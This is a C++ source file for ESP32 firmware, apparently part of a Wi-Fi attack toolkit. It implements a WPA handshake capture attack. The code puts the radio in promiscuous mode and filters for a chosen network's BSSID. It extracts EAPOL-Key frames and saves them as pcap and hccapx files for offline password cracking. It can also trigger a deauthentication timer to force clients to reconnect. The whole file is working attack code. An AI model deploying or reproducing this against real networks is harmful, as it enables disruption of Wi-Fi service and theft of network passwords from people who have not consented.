#include "Pcap.h"
#include "Hccapx.h"
#include "Handshake.h"
#include "esp_wifi.h"

#include "models/wifi/attack/deauth/Deauth.h"
#include "api/event/EspEvent.h"
#include "api/event/EventsApi.h"
#include "core/LedManager.h"
#include "core/Logger.h"
#include "models/wifi/select/WifiSelect.h"
#include "models/wifi/utils/utils.h"
#include "models/wifi/types/frame.h"
#include "models/wifi/types/info.h"

static const char *TAG = "Wifi-Attack-Handshake";

HandshakeType WifiAttackHandshake::_type = HandshakeType::Unknown;

void WifiAttackHandshake::start(const char *ssid, const HandshakeType type) {
    PcapSerializer::clear();
    HccapxSerializer::clear();
    EventsApi::sendHccapxStatus(false);
    _type = type;

    wifi::turnModeAPSTA();
    PcapSerializer::init();
    HccapxSerializer::init(ssid);

    esp_wifi_set_promiscuous(true);
    wifi::wifiFilterFrameTypes(true, true, false);
    esp_wifi_set_promiscuous_rx_cb(&onPacketReceived);

    esp_event_handler_register(
        ESP_FRAME_EVENT,
        DATA_FRAME_EVENT_EAPOLKEY_FRAME,
        &eapolKeyFrameHandler,
        nullptr
    );

    attackMethodStart();

    LedManager::setStatus(LedStatus::Error);
    LOG_I(TAG, "WiFi attack handshake started");
}

void WifiAttackHandshake::stop() {
    attackMethodStop();

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    esp_event_handler_unregister(ESP_FRAME_EVENT, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolKeyFrameHandler);

    wifi::disableModeAPSTA();

    _type = HandshakeType::Unknown;

    LedManager::setStatus(LedStatus::Successful);
    LOG_I(TAG, "WiFi attack handshake stopped");
}

void WifiAttackHandshake::onPacketReceived(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)buf;

    if(!WifiSelect::hasNetwork()) return;
    const WifiNetworkInfo* selectNetwork = WifiSelect::getNetwork();
    if (!wifi::isFrameBssidMatching(frame, selectNetwork->bssid)) return;

    EapolPacket *eapolPacket = wifi::parseEapolPacket((DataFrame *)frame->payload);
    if (eapolPacket == NULL) return;

    EapolKeyPacket *eapolKeyPacket = wifi::parseEapolKeyPacket(eapolPacket);
    if (eapolKeyPacket == NULL) return;

    esp_event_post(
        ESP_FRAME_EVENT,
        DATA_FRAME_EVENT_EAPOLKEY_FRAME,
        frame,
        sizeof(wifi_promiscuous_pkt_t) + frame->rx_ctrl.sig_len,
        portMAX_DELAY
    );
}

void WifiAttackHandshake::eapolKeyFrameHandler(void *args, esp_event_base_t eventBase, int32_t eventId, void *eventData) {
    LOG_I(TAG, "EAPOL-Key packet true");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)eventData;
    PcapSerializer::serializerAddFrame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    HccapxSerializer::serializerAddFrame((DataFrame *)frame->payload);

    EventsApi::sendHccapxStatus(HccapxSerializer::ready());
}

void WifiAttackHandshake::attackMethodStart(){
    switch(_type){
        case HandshakeType::Deauth:{
            LOG_I(TAG, "Fallback to Deauth");
            WifiAttackDeauth::startTimer(20);
            break;
        }
        case HandshakeType::Broadcast:{
            LOG_I(TAG, "Fallback to Broadcast");
            break;
        }
        case HandshakeType::Passive:{
            LOG_I(TAG, "Fallback to Passive");
            break;
        }
        default:
            LOG_I(TAG, "Method unknown! Fallback to Passive");
    }
}

void WifiAttackHandshake::attackMethodStop(){
     switch(_type){
        case HandshakeType::Deauth:{
            WifiAttackDeauth::stopTimer();
            break;
        }
        case HandshakeType::Broadcast:{
            break;
        }
        case HandshakeType::Passive:{
            break;
        }
        default:
            LOG_I(TAG, "Method unknown stop! Fallback to Passive");
    }
}